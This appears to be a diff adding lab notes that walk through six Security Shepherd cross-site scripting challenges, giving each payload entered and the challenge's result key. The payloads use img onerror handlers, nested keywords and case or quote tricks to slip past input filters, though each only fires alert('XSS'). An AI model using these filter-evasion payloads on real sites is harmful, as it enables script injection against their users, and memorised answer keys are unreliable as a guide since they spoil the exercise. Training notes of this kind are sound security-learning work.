@@ -1,0 +1,80 @@
+.. include:: /pentest_links.txt
+
+.. _SecurityShepherdXSS:
+
+***
+XSS
+***
+
+
+Cross Site Scripting 1
+======================
+
+Entering ``<img src=# onerror='alert("XSS")' />`` in the :guilabel:`Get this user` button gives:
+
+.. code-block:: console
+  :emphasize-lines: 1-2
+
+  The result key for this challenge is
+  gRocn2vQgAX2JKPE9GV6fn7KOSnUvXiBy3fCq2AouFn3dghaxAHkI3wLqg2a9FL8WuwjuQMZmwI1XO7lgwQzXn8EeHVPHCcw2dsH/s8fw2Q=
+
+
+Cross Site Scripting 2
+======================
+
+Entering ``<img="x.png" onpageshow="alert('XSS')" />`` in the :guilabel:`Get this user` button gives:
+
+.. code-block:: console
+  :emphasize-lines: 1-2
+
+  The result key for this challenge is
+  M7woBTdKQOpOgZzgLFzCtsnfY3p2aQ4v01pN6jPsqGpbBgXyPet1CyDYvlQZW+vFlm3bg+ilsy5yYiNMC7QYw4RiHvBYo5Sgiraj10jWC4U=
+
+
+Cross Site Scripting 3
+======================
+
+One trick is to nest forbidden strings; here need to nest 5 levels deep. The desired string ``<img src="images/shepherdAndSheep.jpg"  onerror="alert('XSS')"   >`` needs "onerror" nested 5 deep (add spaces for clarity): "on on on on onerror error error error error". Without spaces it's "onononononerrorerrorerrorerrorerror". Enter ``<img src="images/shepherdAndSheep.jpg"  onononononerrorerrorerrorerrorerror="alert('XSS')" >`` in the :guilabel:`Get this user` button to get:
+
+.. code-block:: console
+  :emphasize-lines: 1-2
+
+  The result key for this challenge is
+  qyZaRcNodaCLe8YEZ371Qa8GMFJro11/eFe5cGN60AnDiTFU39NmTEKgM0DPdI/TX87R22ghKY1lsPEcbEUsFKsvEQ5qPLsd1sQWN4WY1Cs=
+
+
+Cross Site Scripting 4
+======================
+
+The answer requires "http" at the beginning; adding a double quote (") stops http processing, but not single quote ('); it also seems to scan for the word "on" and "ON" so needs "On" or "oN". Given these constraints, enter ``http"Onerror=alert('XSS')`` in the :guilabel:`Make Post` button to get:
+
+.. code-block:: console
+  :emphasize-lines: 1-2
+
+  The result key for this challenge is
+  YGYNB8x3BzBSAJFLky2PnfrFA2cl3Za8pAFy/3MkJMqaYdv1aOqWUrcx8sDWcOEUHrDVSceMoTKCvJYdGKlCiIZ6h6Ea4ODSrbM+WDGV2FFYMl6pg6ASHhy7ABQfw50n
+
+
+Cross Site Scripting 5
+======================
+
+The answer requires "http:" at the beginning; adding two double quotes ("") stops http processing, but not two single quotes (''). Given these constraints, enter ``http:""onerror=alert('XSS')`` in the :guilabel:`Make Post` button to get:
+
+.. code-block:: console
+  :emphasize-lines: 1-2
+
+  The result key for this challenge is
+  E4fqRbtCHEgUpHOG9y+y+dWWMeLXynAc8t1273Ixm6PySONc2XaPM5JvrlzK8IF9a8JZi0Xqz1KhU7Ziyz3DO/6rf1Ynhoa4iy4v2kKHcbx2azTxbfdKr72AvUIsOqrA
+
+
+Cross Site Scripting 6
+======================
+
+The answer requires "http:" at the beginning; adding two double quotes ("") stops http processing, but not two single quotes (''). Given these constraints, enter ``http:""onerror=alert('XSS')`` in the :guilabel:`Make Post` button to get:
+
+.. code-block:: console
+  :emphasize-lines: 1-2
+
+  The result key for this challenge is
+  jqgOTvERaD/8gITdzL/Q8S30MDmP/q+wQWTjDj0k33E7wALzyg0mBT+zCcNqWv8AOm1CTu9oOJePf3iwPwqUw/ipjhV10DmD7lNannqDbgM=
+
